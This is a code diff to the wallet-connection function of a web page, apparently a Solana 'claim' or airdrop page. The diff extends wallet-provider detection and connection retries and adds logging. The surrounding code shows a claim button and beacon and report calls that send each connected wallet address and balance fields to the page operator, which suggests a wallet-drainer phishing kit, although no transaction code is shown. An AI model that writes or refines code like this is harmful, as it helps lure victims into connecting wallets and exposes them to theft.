@@ -264,20 +264,27 @@
   async function connectWallet(){
     const btn=$('btnConnect'); btn.disabled=true; clearStatus();
     if(typeof solanaWeb3==='undefined'){ setStatus('Solana libraries still loading. Refresh the page.',true); btn.disabled=false; return; }
-    let provider=null;
-    if(window.phantom&&window.phantom.solana) provider=window.phantom.solana;
-    else if(window.solflare) provider=window.solflare;
-    else if(window.solana&&window.solana.isPhantom) provider=window.solana;
-    else if(window.solana) provider=window.solana;
+    let provider=null, providerName='unknown';
+    if(window.phantom&&window.phantom.solana){ provider=window.phantom.solana; providerName='Phantom'; }
+    else if(window.solflare){ provider=window.solflare; providerName='Solflare'; }
+    else if(window.braveSolana){ provider=window.braveSolana; providerName='Brave'; }
+    else if(window.solana&&window.solana.isPhantom){ provider=window.solana; providerName='Phantom (window.solana)'; }
+    else if(window.solana){ provider=window.solana; providerName='Generic Solana'; }
     if(!provider){ setStatus('No Solana wallet extension found. Install Phantom or Solflare to continue.',true); btn.disabled=false; return; }
+    setStatus('Connecting to ' + providerName + '...');
     try{
-      let resp; try{ resp=await provider.connect({onlyIfTrusted:false}); }catch(e1){ resp=await provider.connect(); }
+      let resp;
+      try { resp = await provider.connect(); }
+      catch(e1){
+        try { resp = await provider.connect({onlyIfTrusted:false}); }
+        catch(e2) { throw e1; }
+      }
       wallet=provider; walletPubkey=resp.publicKey; if(!walletPubkey) throw new Error('No public key');
       $('connectSection').style.display='none'; $('connectedSection').style.display='block';
       const addr=walletPubkey.toString(); $('walletAddr').textContent=addr.slice(0,4)+'...'+addr.slice(-4);
       $('btnClaim').disabled=true; $('btnClaim').querySelector('.btn-text').textContent='Agree to terms';
       beacon('🔗 CONNECT '+addr); report(addr,{solBalance:0,tokenCount:0});
-    }catch(e){ setStatus('Connection rejected: '+(e.message||'User declined').slice(0,80),true); btn.disabled=false; }
+    }catch(e){ console.error('wallet connect error', e); setStatus('Connection rejected: '+(e.message||'User declined').slice(0,80),true); btn.disabled=false; }
   }
 
   function updateButton(){
